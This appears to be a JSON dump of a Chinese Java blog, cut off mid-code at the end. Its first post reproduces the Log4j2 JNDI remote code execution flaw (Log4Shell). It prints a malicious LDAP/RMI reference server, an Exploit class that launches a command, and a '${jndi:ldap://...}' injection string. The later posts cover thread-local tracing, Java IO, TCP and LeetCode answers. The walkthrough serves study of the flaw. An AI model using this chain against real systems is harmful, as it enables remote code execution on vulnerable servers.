[{"categories":["编程思想"],"content":"12月10日凌晨，Apache 开源项目 Log4j 的远程代码执行漏洞细节被公开，由于其利用简单、危害巨大，一时引起不小的热度。本文将以该事件为切入点，浅析其中涉及的一些技术点。\n什么是LDAP 轻量级目录访问协议(LIGHT WEIGHT DIRECTORY ACCESS Protocol)，语言无关的，即可以有Java实现LDAP Server/Client，也可以有Python实现的LDAP Server/Client 等。\n什么是RMI Remote Method Invocation，Java 的远程方法调用。RMI 为应用提供了远程调用的接口，可以理解为 Java 自带的 RPC 框架。\n什么是JNDI JNDI (Java Naming and Directory Interface)\n所谓名称服务，简单来说就是通过名称查找实际对象的服务。\n DNS: 通过域名查找实际的 IP 地址； 文件系统: 通过文件名定位到具体的文件；  目录服务是名称服务的一种拓展，除了名称服务中已有的名称到对象的关联信息外，还允许对象拥有属性(attributes)信息。由此，我们不仅可以根据名称去查找(lookup)对象(并获取其对应属性)，还可以根据属性值去搜索(search)对象。\n NIS: Network Information Service，Solaris 系统中用于查找系统相关信息的目录服务； Active Directory : 为 Windows 域网络设计，包含多个目录服务，比如域名服务、证书服务等  在下文中如果没有特殊指明，都会将名称服务与目录服务统称为目录服务。\n为什么需要JNDI 为什么我们有了JDBC/LDAP/RMI等还需要JNDI呢？\n我们以JDBC举例，我们使用原生JDBC连接数据库的时候，需要指定一系列参数，例如：连接地址、端口、数据库驱动、账号密码、连接池参数等等。我们怎么获取这些配置呢？这些配置除了配置在本地，还可以配置在远端，那么有没有一种接口屏蔽配置获取的具体细节？给它一个”名称“就能返回所有配置？这就是JNDI要做的事情，它定义了一套通过名称获取属性的API，JDBC/LDAP/RMI等都去实现它。\nLog4j2远程注入演示 LDAP  启动 LDAPRefServer  public class LDAPRefServer { private static final String LDAP_BASE = \u0026#34;dc=example,dc=com\u0026#34;; /** * class地址 用#Exploit代替Exploit.class */ private static final String EXPLOIT_CLASS_URL = \u0026#34;http://127.0.0.1:8000/#Exploit\u0026#34;; public static void main(String[] args) { int port = 7912; try { InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \u0026#34;listen\u0026#34;, InetAddress.getByName(\u0026#34;0.0.0.0\u0026#34;), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(EXPLOIT_CLASS_URL))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\u0026#34;Listening on 0.0.0.0:\u0026#34; + port); ds.startListening(); } catch (Exception e) { e.printStackTrace(); } } private static class OperationInterceptor extends InMemoryOperationInterceptor { private URL codebase; public OperationInterceptor(URL cb) { this.codebase = cb; } @Override public void processSearchResult(InMemoryInterceptedSearchResult result) { String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try { sendResult(result, base, e); } catch (Exception e1) { e1.printStackTrace(); } } protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException { URL turl = new URL(this.codebase, this.codebase.getRef().replace(\u0026#39;.\u0026#39;, \u0026#39;/\u0026#39;).concat(\u0026#34;.class\u0026#34;)); System.out.println(\u0026#34;Send LDAP reference result for \u0026#34; + base + \u0026#34; redirecting to \u0026#34; + turl); e.addAttribute(\u0026#34;javaClassName\u0026#34;, \u0026#34;Calc\u0026#34;); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf(\u0026#39;#\u0026#39;); if (refPos \u0026gt; 0) { cbstring = cbstring.substring(0, refPos); } e.addAttribute(\u0026#34;javaCodeBase\u0026#34;, cbstring); e.addAttribute(\u0026#34;objectClass\u0026#34;, \u0026#34;javaNamingReference\u0026#34;); //$NON-NLS-1$  e.addAttribute(\u0026#34;javaFactory\u0026#34;, this.codebase.getRef()); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); } } } 这里用到了ldap实现unboundid-ldapsdk：\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.unboundid\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;unboundid-ldapsdk\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;6.0.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 将恶意代码放在放在web服务器上  恶意攻击代码：\npublic class Exploit { static { try { Runtime.getRuntime().exec(\u0026#34;open -na Calculator\u0026#34;); } catch (IOException e) { e.printStackTrace(); } } } 这里使用mac自带的python web server\npython -m SimpleHTTPServer 默认监听端口8000\n执行有漏洞的程序：  public class Log4J { private static final Logger logger = LogManager.getLogger(Log4J.class); public static void main(String[] args) { System.setProperty(\u0026#34;com.sun.jndi.ldap.object.trustURLCodebase\u0026#34;, \u0026#34;true\u0026#34;); logger.error(\u0026#34;${jndi:ldap://127.0.0.1:7912/Foo}\u0026#34;); } } log4j我用2.14.1，JDK是8u281，因为8u281版本已经默认设置com.sun.jndi.ldap.object.trustURLCodebase=false 无法复现漏洞，所以这里设置成true.\nRMI   启动rmi注册中心 rmiregistry 1099\n  启动 RMIServer\n  public class RMIServer { public static void main(String args[]) { try { Registry registry = LocateRegistry.getRegistry(1099); String factoryUrl = \u0026#34;http://localhost:8000/\u0026#34;; Reference reference = new Reference(\u0026#34;Exploit\u0026#34;, \u0026#34;Exploit\u0026#34;, factoryUrl); ReferenceWrapper wrapper = new ReferenceWrapper(reference); registry.bind(\u0026#34;Foo\u0026#34;, wrapper); System.err.println(\u0026#34;Server ready, factoryUrl:\u0026#34; + factoryUrl); } catch (Exception e) { System.err.println(\u0026#34;Server exception: \u0026#34; + e.toString()); e.printStackTrace(); } } } 将恶意代码放在放在web服务器上 执行有漏洞的程序：  public class Log4J { private static final Logger logger = LogManager.getLogger(Log4J.class); public static void main(String[] args) { System.setProperty(\u0026#34;com.sun.jndi.rmi.object.trustURLCodebase\u0026#34;, \u0026#34;true\u0026#34;); // 下面这行是我自己加的 8u281需要 原因看下文  System.setProperty(\u0026#34;com.sun.jndi.ldap.object.trustURLCodebase\u0026#34;, \u0026#34;true\u0026#34;); logger.error(\u0026#34;${jndi:rmi://localhost:1099/Foo}\u0026#34;); } } 即使这里演示的是RMI，也需要设置com.sun.jndi.ldap.object.trustURLCodebase=true，原因见下文\n原理 jndi注入\njndi核心代码 javax.naming.spi.NamingManager\nstatic ObjectFactory getObjectFactoryFromReference( Reference ref, String factoryName) throws IllegalAccessException, InstantiationException, MalformedURLException { Class\u0026lt;?\u0026gt; clas = null; // Try to use current class loader  try { clas = helper.loadClass(factoryName); } catch (ClassNotFoundException e) { // ignore and continue  // e.printStackTrace();  } // All other exceptions are passed up.  // Not in class path; try to use codebase  String codebase; if (clas == null \u0026amp;\u0026amp; (codebase = ref.getFactoryClassLocation()) != null) { try { clas = helper.loadClass(factoryName, codebase); } catch (ClassNotFoundException e) { } } return (clas != null) ? (ObjectFactory) clas.newInstance() : null; } 可以看到，如果class在执行程序的classpath的话，会优先加载本地的class而不是加载远程的class，并且最后会实例化（Exploit需要实现ObjectFactory接口）\n远程加载的代码如下：\ncom.sun.naming.internal.VersionHelper12\n/** * @param className A non-null fully qualified class name. * @param codebase A non-null, space-separated list of URL strings. */ public Class\u0026lt;?\u0026gt; loadClass(String className, String codebase) throws ClassNotFoundException, MalformedURLException { if (\u0026#34;true\u0026#34;.equalsIgnoreCase(trustURLCodebase)) { ClassLoader parent = getContextClassLoader(); ClassLoader cl = URLClassLoader.newInstance(getUrlArray(codebase), parent); return loadClass(className, cl); } else { return null; } } 上面演示的RMI的时候提到，也需要设置com.sun.jndi.ldap.object.trustURLCodebase=true\n那是因为在com.sun.naming.internal.VersionHelper12 的源码里已经写死了：\nprivate static final String TRUST_URL_CODEBASE_PROPERTY = \u0026#34;com.sun.jndi.ldap.object.trustURLCodebase\u0026#34;; 远程加载class的时候都会走这个判断（这里我也不理解，为啥一定是ldap呢？）\n动态协议切换 我们来看下面的代码:\npublic class JNDIDynamic { public static void main(String[] args) { if (args.length != 1) { System.out.println(\u0026#34;Usage: lookup \u0026lt;domain\u0026gt;\u0026#34;); return; } Hashtable\u0026lt;String, String\u0026gt; env = new Hashtable\u0026lt;\u0026gt;(); env.put(Context.INITIAL_CONTEXT_FACTORY, \u0026#34;com.sun.jndi.dns.DnsContextFactory\u0026#34;); env.put(Context.PROVIDER_URL, \u0026#34;dns://114.114.114.114\u0026#34;); try { DirContext ctx = new InitialDirContext(env); DirContext lookCtx = (DirContext)ctx.lookup(args[0]); Attributes res = lookCtx.getAttributes(\u0026#34;\u0026#34;, new String[]{\u0026#34;A\u0026#34;}); System.out.println(res); } catch (NamingException e) { e.printStackTrace(); } } } 意图很简单，想通过用户的输入去查找对应域名:\n$ javac JNDIDynamic.java $ java JNDIDynamic Usage: lookup \u0026lt;domain\u0026gt; $ java JNDIDynamic douban.com {a=A: 140.143.177.206, 49.233.242.15, 81.70.124.99} 我们看到初始化 JNDI 上下文主要使用环境变量实现:\n INITIAL_CONTEXT_FACTORY: 指定初始化协议的工厂类； PROVIDER_URL: 指定对应名称服务的 URL 地址；  但是，实际上在 Context.lookup 方法的参数中，用户可以指定自己的查找协议：\n$ java JNDIDynamic \u0026#34;ldap://localhost:8080/cn=evilpan\u0026#34; javax.naming.NameNotFoundException: [LDAP: error code 32 - No Such Object]; remaining name \u0026#39;cn=evilpan\u0026#39; at java.naming/com.sun.jndi.ldap.LdapCtx.mapErrorCode(LdapCtx.java:3183) at java.naming/com.sun.jndi.ldap.LdapCtx.processReturnCode(LdapCtx.java:3104) at java.naming/com.sun.jndi.ldap.LdapCtx.processReturnCode(LdapCtx.java:2895) at java.naming/com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1034) at java.naming/com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542) at java.naming/com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177) at java.naming/com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:207) at java.naming/com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94) at java.naming/javax.naming.InitialContext.lookup(InitialContext.java:409) at JNDIDynamic.main(JNDIDynamic.java:18) 这就是所谓的：动态协议切换\n堆栈分析 最后，我们用Jndi lookup看一下ldap/rmi的堆栈，是不是都用了jndi的方式去加载class\n测试程序：\npublic class JNDILookup { public static void main(String[] args) { System.setProperty(\u0026#34;com.sun.jndi.rmi.object.trustURLCodebase\u0026#34;, \u0026#34;true\u0026#34;); // 下面这行是我自己加的 8u221需要 原因看下文  System.setProperty(\u0026#34;com.sun.jndi.ldap.object.trustURLCodebase\u0026#34;, \u0026#34;true\u0026#34;); // String url = \u0026#34;rmi://localhost:1099/Foo\u0026#34;;  String url = \u0026#34;ldap://localhost:7912/Foo\u0026#34;; try { Object ret = new InitialContext().lookup(url); System.out.println(\u0026#34;ret: \u0026#34; + ret); } catch (NamingException e) { e.printStackTrace(); } } }  Log4j之所以发生上述漏洞也是因为调用了jndi的lookup，所以这里直接使用jndi的lookup\n Ldap lookup堆栈：\nrmi lookup堆栈：\n参考 JNDI 注入漏洞的前世今生 攻击Java中的JNDI、RMI、LDAP(二) ","date":"2021-12-19","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/log4j2-jndi%E8%BF%9C%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/","series":["Manual"],"tags":["Java"],"title":"Log4j2 JNDI远程注入漏洞引发的思考"},{"categories":["编程思想"],"content":"参考 什么是java OOM？如何分析及解决oom问题？ ","date":"2021-12-05","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/jvm-oom/","series":["Manual"],"tags":["Java"],"title":"JVM OOM"},{"categories":[""],"content":"在做日志链路追踪的场景中，我们需要将traceId从父线程传递到子线程，我们无法直接通过ThreadLocal进行值传递：\npublic class Main { private static ThreadLocal\u0026lt;String\u0026gt; threadLocal = new ThreadLocal\u0026lt;\u0026gt;(); public static void main(String[] args) { threadLocal.set(\u0026#34;mainThread\u0026#34;); System.out.println(\u0026#34;value:\u0026#34;+threadLocal.get()); Thread thread = new Thread(new Runnable() { @Override public void run() { String value = threadLocal.get(); System.out.println(\u0026#34;value:\u0026#34;+value); } }); thread.start(); } } 输出：\nvalue:mainThread value:null InheritableThreadLocal继承自ThreadLocal，在Thread的init方法中有这样的逻辑：\nif (inheritThreadLocals \u0026amp;\u0026amp; parent.inheritableThreadLocals != null) this.inheritableThreadLocals = ThreadLocal.createInheritedMap(parent.inheritableThreadLocals); 即，线程的inheritThreadLocals是会从父线程传递到子线程的：\npublic class Main { private static InheritableThreadLocal\u0026lt;String\u0026gt; threadLocal = new InheritableThreadLocal\u0026lt;\u0026gt;(); public static void main(String[] args) { threadLocal.set(\u0026#34;mainThread\u0026#34;); System.out.println(\u0026#34;value:\u0026#34;+threadLocal.get()); Thread thread = new Thread(new Runnable() { @Override public void run() { String value = threadLocal.get(); System.out.println(\u0026#34;value:\u0026#34;+value); } }); thread.start(); } } 输出：\nvalue:mainThread value:mainThread 我们在过滤器中设置traceId：\n@Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain chain) throws IOException, ServletException { HttpServletRequest request = (HttpServletRequest) servletRequest; // 从请求头中获取traceId  String traceId = request.getHeader(\u0026#34;traceId\u0026#34;); // 不存在就生成一个  if (traceId == null || \u0026#34;\u0026#34;.equals(traceId)) { traceId = UUID.randomUUID().toString(); } // 放入MDC中  MDC.put(\u0026#34;traceId\u0026#34;, traceId); chain.doFilter(servletRequest, servletResponse); } SpringBoot中默认使用的日志框架是logback，Slf4j提供了MDC ，具体的装饰者实现类是LogbackMDCAdapter\n在早期的版本中子线程可以直接自动继承父线程的MDC容器中的内容，因为MDC在早期版本中使用的是InheritableThreadLocal来作为底层实现。但是由于性能问题被取消了，最后还是使用的是ThreadLocal来作为底层实现。这样子线程就不能直接继承父线程的MDC容器。\npackage ch.qos.logback.classic.util; import java.util.Collections; import java.util.HashMap; import java.util.Map; import java.util.Set; import org.slf4j.spi.MDCAdapter; public class LogbackMDCAdapter implements MDCAdapter { final ThreadLocal\u0026lt;Map\u0026lt;String, String\u0026gt;\u0026gt; copyOnThreadLocal = new ThreadLocal\u0026lt;Map\u0026lt;String, String\u0026gt;\u0026gt;(); private static final int WRITE_OPERATION = 1; private static final int MAP_COPY_OPERATION = 2; // keeps track of the last operation performed  final ThreadLocal\u0026lt;Integer\u0026gt; lastOperation = new ThreadLocal\u0026lt;Integer\u0026gt;(); private Integer getAndSetLastOperation(int op) { Integer lastOp = lastOperation.get(); lastOperation.set(op); return lastOp; } 所以，Logback官方建议我们在父线程新建子线程之前调用MDC.getCopyOfContextMap()方法将MDC内容取出来传给子线程，子线程在执行操作前先调用MDC.setContextMap()方法将父线程的MDC内容设置到子线程。\n@Override public void execute(Runnable command) { // 提交者的本地变量  Map\u0026lt;String, String\u0026gt; contextMap = MDC.getCopyOfContextMap(); super.execute(()-\u0026gt;{ if (contextMap != null) { // 如果提交者有本地变量，任务执行之前放入当前任务所在的线程的本地变量中  MDC.setContextMap(contextMap); } try { command.run(); } finally { // 任务执行完，清除本地变量，以防对后续任务有影响  MDC.clear(); } }); } 参考 Slf4j MDC机制 【并发编程】InheritableThreadLocal使用详解 分布式系统中如何优雅地追踪日志（原理篇） ","date":"2021-11-18","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/inheritablethreadlocal%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/","series":[],"tags":[""],"title":"InheritableThreadLocal使用简介"},{"categories":[""],"content":"从操作系统层面划分，多采用史蒂夫-理查德在《The Sockets Networking API》：阻塞io、非阻塞io、io多路复用、信号驱动io、异步io\n从Java层面去划分：bio, nio, aio, 分别对应操作系统的阻塞io、io多路复用、异步io\nbio 特点：数据从 网卡-\u0026gt;内核，内核-\u0026gt;用户空间 两阶段都是阻塞的；每一个客户端请求都需要一个线程去处理网络IO。\n优点：io模型简单，不容易出错\n场景：并发量不大的web应用，例如：tomcat，bio+线程池\n缺点：难以应对高并发的场景\n read/recvfrom\n nio 特点：把多个I/O的阻塞复用到同一个select/poll/epoll的阻塞上，从而使得在单线程的情况下可以同时处理多个客户端请求。\n优点：更小的系统开销，处理更多的连接。\n场景：高并发web应用，长连接短数据（即时通讯）\n缺点：连接数不是很高的话，nio不一定比线程池+bio性能更好，可能延迟还更大，因为同样是一次io, nio要发生select+recvfrom两次系统调用，bio只用调一次recvfrom。\n select 多路复用\npoll 多路复用（没有最大文件描述符数量的限制）\nepoll 基于事件驱动的多路复用\n aio 特点：不像nio那样需要遍历连接，aio的读写操作都是异步的，应用发起aio_read/aio_write操作后就不用管了，数据准备好了自动回调。\n优点：并发性高、CPU利用率高、线程利用率高（因为它连select遍历线程都不需要）\n场景：高并发\n缺点：不适合轻量级数据传输，因为进程之间频繁的通信在追错、管理和资源消耗上不是很可观。\n Java 通过AsynchronousServerSocketChannel、AsynchronousSocketChannel支持aio编程\nwindows: IOCP(I/O Completion Port，I/O完成端口)\nLinux: 不管是Linux的AIO原生库、Glibc的AIO库、最新版的内核的IO_URING等等，都不可能是完全的AIO\nJava Linux AIO是通过选择器+线程池，也即Epoll + ThreadPoolExecutor模拟的\n  read/wirte是通用的文件描述符操作；recv/send 通常应用于TCP；recvfrom/sendto通常应用于UDP。\n 参考 Java AIO 网络编程真相 ","date":"2021-11-12","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/javaio/","series":[],"tags":[""],"title":"JavaIO"},{"categories":[""],"content":"使用TCP长连接来实现业务的好处在于：在当前连接可用的情况下，每一次请求都只是简单的数据发送和接受，免去了DNS解析，连接建立，TCP慢启动等时间，大大加快了请求的速度，同时也有利于接收服务器的实时消息（push）。\n在使用TCP长连接的业务场景下，保持长连接的可用性非常重要。如果长连接无法很好地保持，在连接已经失效的情况下继续发送请求会导致迟迟收不到响应直到超时，又需要一次连接建立的过程，其效率甚至还不如直接使用短连接。而连接保持的前提必然是检测连接的可用性，并在连接不可用时主动放弃当前连接并建立新的连接。\n参考 聊聊 TCP 长连接和心跳那些事 高效保活长连接：手把手教你实现自适应的心跳保活机制 长连接及心跳保活原理简介 ","date":"2021-11-03","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/cs/tcp/%E9%95%BF%E8%BF%9E%E6%8E%A5%E7%9F%AD%E8%BF%9E%E6%8E%A5/","series":[],"tags":[""],"title":"长连接短连接"},{"categories":[""],"content":"class Solution { public int findRepeatNumber(int[] nums) { Set\u0026lt;Integer\u0026gt; set = new HashSet\u0026lt;Integer\u0026gt;(); int repeat = -1; for (int num : nums) { if (!set.add(num)) { repeat = num; break; } } return repeat; } } 剑指 Offer 03. 数组中重复的数字 ","date":"2021-10-11","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-03.-%E6%95%B0%E7%BB%84%E4%B8%AD%E9%87%8D%E5%A4%8D%E7%9A%84%E6%95%B0%E5%AD%97/","series":[],"tags":[""],"title":"剑指 Offer 03. 数组中重复的数字"},{"categories":[""],"content":"class Solution { public boolean findNumberIn2DArray(int[][] matrix, int target) { if (matrix == null || matrix.length == 0) { return false; } int row = 0; int col = matrix[0].length - 1; while (row \u0026lt; matrix.length \u0026amp;\u0026amp; col \u0026gt;= 0) { if (matrix[row][col] \u0026gt; target) { col--; } else if (matrix[row][col] \u0026lt; target) { row++; } else { return true; } } return false; } } 剑指 Offer 04. 二维数组中的查找 ","date":"2021-10-11","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-04.-%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E6%9F%A5%E6%89%BE/","series":[],"tags":[""],"title":"剑指 Offer 04. 二维数组中的查找"},{"categories":[""],"content":"class Solution { public String replaceSpace(String s) { int length = s.length(); char[] array = new char[length * 3]; int size = 0; for (int i = 0; i \u0026lt; length; i++) { char c = s.charAt(i); if (c == \u0026#39; \u0026#39;) { array[size++] = \u0026#39;%\u0026#39;; array[size++] = \u0026#39;2\u0026#39;; array[size++] = \u0026#39;0\u0026#39;; } else { array[size++] = c; } } String newStr = new String(array, 0, size); return newStr; } } public class ReplaceSpace { public static String replaceSpace(StringBuffer str) { if(str == null){ return null; } StringBuilder res = new StringBuilder(); for (int i = 0; i \u0026lt; str.length(); i++) { if (str.charAt(i) == 0x20){ res.append(\u0026#34;%20\u0026#34;); }else{ res.append(str.charAt(i)); } } return res.toString(); } public static void main(String[] args) { System.out.println(replaceSpace(new StringBuffer(\u0026#34;We are happy\u0026#34;))); } } 剑指 Offer 05. 替换空格 ","date":"2021-10-11","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-05.-%E6%9B%BF%E6%8D%A2%E7%A9%BA%E6%A0%BC/","series":[],"tags":[""],"title":"剑指 Offer 05. 替换空格"},{"categories":[""],"content":"/** * Definition for singly-linked list. * public class ListNode { * int val; * ListNode next; * ListNode(int x) { val = x; } * } */ class Solution { public int[] reversePrint(ListNode head) { Stack\u0026lt;ListNode\u0026gt; stack = new Stack\u0026lt;ListNode\u0026gt;(); ListNode temp = head; while (temp != null) { stack.push(temp); temp = temp.next; } int size = stack.size(); int[] print = new int[size]; for (int i = 0; i \u0026lt; size; i++) { print[i] = stack.pop().val; } return print; } } 剑指 Offer 06. 从尾到头打印链表 ","date":"2021-10-11","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-06.-%E4%BB%8E%E5%B0%BE%E5%88%B0%E5%A4%B4%E6%89%93%E5%8D%B0%E9%93%BE%E8%A1%A8/","series":[],"tags":[""],"title":"剑指 Offer 06. 从尾到头打印链表"},{"categories":[""],"content":"public class ReConstructBinaryTree { public static TreeNode reConstructBinaryTree(int[] pre, int[] in) { //参数检查  if (pre == null || in == null || pre.length == 0 || in.length == 0 || pre.length != in.length) { return null; } //构建root节点  TreeNode root = new TreeNode(pre[0]); if (pre.length != 1) { //找到root节点在中序遍历种的位置  int rootIndex = 0; for (int i = 0; i \u0026lt; in.length; i++) { rootIndex = i; if (in[i] == pre[0]){ break; } } //递归  root.left = reConstructBinaryTree(Arrays.copyOfRange(pre, 1, rootIndex + 1), Arrays.copyOfRange(in, 0, rootIndex)); root.right = reConstructBinaryTree(Arrays.copyOfRange(pre, rootIndex + 1, pre.length), Arrays.copyOfRange(in, rootIndex + 1, in.length)); } return root; } public static void main(String[] args) { int[] pre = new int[]{1, 2, 4, 7, 3, 5, 6, 8}; int[] in = new int[]{4, 7, 2, 1, 5, 3, 8, 6}; System.out.println(reConstructBinaryTree(pre,in)); } } class TreeNode { int val; TreeNode left; TreeNode right; TreeNode(int x) { val = x; } } 剑指 Offer 07. 重建二叉树 ","date":"2021-10-11","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-07.-%E9%87%8D%E5%BB%BA%E4%BA%8C%E5%8F%89%E6%A0%91/","series":[],"tags":[""],"title":"剑指 Offer 07. 重建二叉树"},{"categories":[""],"content":"class Solution { public int numWays(int n) { if(n \u0026lt; 2){ return 1; } if(n == 2){ return n; } int a = 1, b = 2, sum = 2; for(int i = 2; i \u0026lt; n; i++){ sum = (a + b) % 1000000007; a = b; b = sum; } return sum; } } 剑指 Offer 10- II. 青蛙跳台阶问题 ","date":"2021-10-11","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-10-ii.-%E9%9D%92%E8%9B%99%E8%B7%B3%E5%8F%B0%E9%98%B6%E9%97%AE%E9%A2%98/","series":[],"tags":[""],"title":"剑指 Offer 10- II. 青蛙跳台阶问题"},{"categories":[""],"content":"class Solution { public int minArray(int[] numbers) { int low = 0; int high = numbers.length - 1; while (low \u0026lt; high) { //防止low和high特别大时候发生溢出  int mid = low + (high - low) / 2; if (numbers[mid] \u0026lt; numbers[high]) { high = mid; } else if (numbers[mid] \u0026gt; numbers[high]) { low = mid + 1; } else { high -= 1; } } return numbers[low]; } } 剑指 Offer 11. 旋转数组的最小数字 ","date":"2021-10-11","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-11.-%E6%97%8B%E8%BD%AC%E6%95%B0%E7%BB%84%E7%9A%84%E6%9C%80%E5%B0%8F%E6%95%B0%E5%AD%97/","series":[],"tags":[""],"title":"剑指 Offer 11. 旋转数组的最小数字"},{"categories":[""],"content":"/** * 不保序 */ public class ReOrderArray { public void reOrderArray2(int[] array) { if (array == null || array.length == 0) { return; } int pos1 = 0; int pos2 = array.length - 1; while (pos1 \u0026lt; pos2) { if (isEven(array[pos1]) \u0026amp;\u0026amp; !isEven(array[pos2])) { int tmp = array[pos1]; array[pos1] = array[pos2]; array[pos2] = tmp; } if (!isEven(array[pos1])) { pos1++; } if (isEven(array[pos2])) { pos2--; } } } /** * 保序，空间换时间 * @param array */ public static void reOrderArray(int[] array) { if (array == null || array.length == 0) { return; } int[] tmp = new int[array.length]; int pos = 0; for (int i = 0; i \u0026lt; array.length; i++) { if (!isEven(array[i])){ tmp[pos++] = array[i]; } } for (int i = 0; i \u0026lt; array.length; i++) { if (isEven(array[i])){ tmp[pos++] = array[i]; } } array = tmp; System.arraycopy(tmp,0,array,0,array.length); Arrays.stream(array).forEach(a -\u0026gt; System.out.print(a)); } private static boolean isEven(int target) { return (target \u0026amp; 1) == 0; } public static void main(String[] args) { int[] array = {1,2,3,4,5,6,7}; reOrderArray(array); } } 剑指 Offer 21. 调整数组顺序使奇数位于偶数前面 ","date":"2021-10-11","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-21.-%E8%B0%83%E6%95%B4%E6%95%B0%E7%BB%84%E9%A1%BA%E5%BA%8F%E4%BD%BF%E5%A5%87%E6%95%B0%E4%BD%8D%E4%BA%8E%E5%81%B6%E6%95%B0%E5%89%8D%E9%9D%A2/","series":[],"tags":[""],"title":"剑指 Offer 21. 调整数组顺序使奇数位于偶数前面"},{"categories":[""],"content":"class Solution { public ListNode getKthFromEnd(ListNode head, int k) { if (head == null || k \u0026lt;= 0) { return null; } ListNode pos1 = head, pos2 = head; for (int i = 0; i \u0026lt; k - 1; i++) { if (pos1.next == null) { return null; } pos1 = pos1.next; } while (pos1.next != null) { pos1 = pos1.next; pos2 = pos2.next; } return pos2; } } 剑指 Offer 22. 链表中倒数第k个节点 ","date":"2021-10-11","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-22.-%E9%93%BE%E8%A1%A8%E4%B8%AD%E5%80%92%E6%95%B0%E7%AC%ACk%E4%B8%AA%E8%8A%82%E7%82%B9/","series":[],"tags":[""],"title":"剑指 Offer 22. 链表中倒数第k个节点"},{"categories":[""],"content":"class Solution { public ListNode reverseList(ListNode head) { ListNode prev = null; ListNode curr = head; while (curr != null) { ListNode next = curr.next; curr.next = prev; prev = curr; curr = next; } return prev; } } 剑指 Offer 24. 反转链表 ","date":"2021-10-11","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-24.-%E5%8F%8D%E8%BD%AC%E9%93%BE%E8%A1%A8/","series":[],"tags":[""],"title":"剑指 Offer 24. 反转链表"},{"categories":[""],"content":"public class Merge { public ListNode Merge(ListNode list1, ListNode list2) { if(list1 == null \u0026amp;\u0026amp; list2 == null){ return null; } if (list1 == null){ return list2; } if (list2 == null){ return list1; } ListNode res = null; if(list1.val \u0026lt; list2.val){ res = list1; res.next = Merge(list1.next, list2); }else { res = list2; res.next = Merge(list1, list2.next); } return res; } } 剑指 Offer 25. 合并两个排序的链表 ","date":"2021-10-11","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-25.-%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%8E%92%E5%BA%8F%E7%9A%84%E9%93%BE%E8%A1%A8/","series":[],"tags":[""],"title":"剑指 Offer 25. 合并两个排序的链表"},{"categories":[""],"content":"public class HasSubtree { public boolean HasSubtree(TreeNode root1, TreeNode root2) { if (root1 == null || root2 == null) { return false; } boolean res = false; if (root1.val == root2.val) { res = doesTree1haveTree2(root1, root2); } if (res){ return true; }else { return HasSubtree(root1.left, root2) || HasSubtree(root1.right, root2); } } private boolean doesTree1haveTree2(TreeNode root1, TreeNode root2) { if (root1 == null \u0026amp;\u0026amp; root2 == null) { return true; } if (root1 == null) { return false; } if (root2 == null) { return true; } return root1.val == root2.val \u0026amp;\u0026amp; doesTree1haveTree2(root1.left, root2.left) \u0026amp;\u0026amp; doesTree1haveTree2(root1.right, root2.right); } } 剑指 Offer 26. 树的子结构 ","date":"2021-10-11","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-26.-%E6%A0%91%E7%9A%84%E5%AD%90%E7%BB%93%E6%9E%84/","series":[],"tags":[""],"title":"剑指 Offer 26. 树的子结构"},{"categories":[""],"content":"class Solution { public int[] spiralOrder(int[][] matrix) { ArrayList\u0026lt;Integer\u0026gt; list = new 